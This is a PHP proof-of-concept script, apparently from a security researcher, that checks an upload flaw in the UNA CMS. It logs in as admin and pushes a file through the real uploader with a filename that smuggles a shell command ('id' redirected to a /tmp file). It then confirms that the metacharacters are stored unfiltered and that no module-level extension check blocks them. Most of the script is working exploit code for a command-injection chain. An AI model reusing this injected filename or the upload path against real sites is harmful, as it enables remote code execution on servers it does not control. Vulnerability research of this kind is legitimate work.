<?php
/**
 * 补充验证（gate 缺口）：
 * 走 storage_uploader.php?a=upload 完全相同的调用路径：
 *   BxDolUploader::getObjectInstance('sys_html5','bx_files_files',$uniqId)->handleUploads($iProfileId, $_FILES['f'], ...)
 * 使用 multipart 语义文件名（$_FILES['name'] 含 shell 元字符），确认：
 *   1) storage 层无额外拦截（非仅 Path helper 特例）；
 *   2) 恶意 ext 以 storage 真实上传 handler 路径落库；
 *   3) 模块层（bx_files）无额外扩展名白名单/类型校验拦截该上传。
 */
error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors', 1);

$_SERVER['HTTP_HOST'] = 'localhost';
$_SERVER['HTTP_USER_AGENT'] = 'UNA';
$_SERVER['REQUEST_URI'] = '/';
$_ENV['UNA_SKIP_REDIRECT'] = '1';
$_ENV['UNA_SKIP_INSTALL_FOLDER_CHECK'] = '1';

require('/var/www/html/inc/header.inc.php');
$oDb = BxDolDb::getInstance();

echo "=== [A] 真实 HTTP 上传 handler (BxDolUploader::handleUploads) 路径验证 ===\n";

// 1. 以 admin(account 1) 建立登录态
$oAccount = BxDolAccount::getInstance('admin@una.local');
if (!$oAccount) { echo "admin not found\n"; exit(1); }
bx_login($oAccount->id(), true);
$GLOBALS['logged'] = ['admin' => true, 'member' => true];
$iProfileId = (int)$oDb->getOne("SELECT `id` FROM `sys_profiles` WHERE `account_id` = 1 LIMIT 1");
if (!$iProfileId) $iProfileId = 1;
echo "登录 profile_id = {$iProfileId}\n";

// 2. 构造 multipart $_FILES（与浏览器上传同名文件一致）
$ts = time();
$sPwn = "/tmp/una_rce_pwn_http_{$ts}";
$sEvilName = "http.pdf\";id>{$sPwn};#";   // ext = pdf";id>/tmp/...;#
$sTmpReal = '/var/www/html/tmp/http_real_' . $ts . '.bin';
file_put_contents($sTmpReal, "HTTP upload path e2e content\n");

$_FILES['f'] = [
    'name' => $sEvilName,
    'type' => 'application/pdf',
    'tmp_name' => $sTmpReal,
    'error' => UPLOAD_ERR_OK,
    'size' => filesize($sTmpReal),
];

// 3. 实例化真实 uploader（storage_uploader.php 同款：uo=sys_html5 so=bx_files_files）
$oUploader = BxDolUploader::getObjectInstance('sys_html5', 'bx_files_files', 'e2euniq' . $ts);
if (!$oUploader) { echo "uploader obj not found\n"; exit(1); }
ob_start();
$oUploader->handleUploads($iProfileId, $_FILES['f'], false, 0, false);
$sJs = ob_get_clean();
echo "handleUploads JS 回调: " . substr(trim($sJs), 0, 200) . "\n";
echo "上传错误消息: '" . $oUploader->getUploadErrorMessages('TXT') . "'\n";

// 4. 检查该上传是否被 storage 层拒绝（若 ext 有额外校验会失败并给出错误消息）
$aFileRec = $oDb->getRow("SELECT * FROM `bx_files_files` WHERE `file_name` = :name ORDER BY `id` DESC LIMIT 1", ['name' => $sEvilName]);
if (!$aFileRec) {
    echo "[!!] 上传 handler 未产生文件记录 —— 存在额外拦截，攻击链在此断裂\n";
    exit(1);
}
echo "✓ 真实上传 handler 接受恶意文件名，DB 记录:\n";
echo "  id={$aFileRec['id']} remote_id={$aFileRec['remote_id']}\n";
echo "  ext='{$aFileRec['ext']}'  (shell 元字符原样落库)\n\n";

// 5. 模块层额外扩展名设置检查（bx_files_allowed_ext 若配置白名单才可能拦截）
$sAllowedExt = (string)$oDb->getOne("SELECT `value` FROM `sys_options` WHERE `name` = 'bx_files_allowed_ext'");
echo "=== [B] 模块层额外扩展名设置 ===\n";
echo "bx_files_allowed_ext = '" . $sAllowedExt . "' (空 => 模块层无额外扩展名白名单)\n";
$sStorageCfg = $oDb->getRow("SELECT `ext_mode`,`ext_allow`,`ext_deny` FROM `sys_objects_storage` WHERE `object`='bx_files_files'");
echo "bx_files_files storage: ext_mode={$sStorageCfg['ext_mode']} ext_allow='{$sStorageCfg['ext_allow']}' ext_deny='{$sStorageCfg['ext_deny']}'\n";
echo "  => ext 校验唯一发生在 storage 层 deny-allow 精确匹配（已证绕过），模块层无二次校验\n\n";

// 6. 清理临时上传文件
@unlink($sTmpReal);
echo "[DONE]\n";
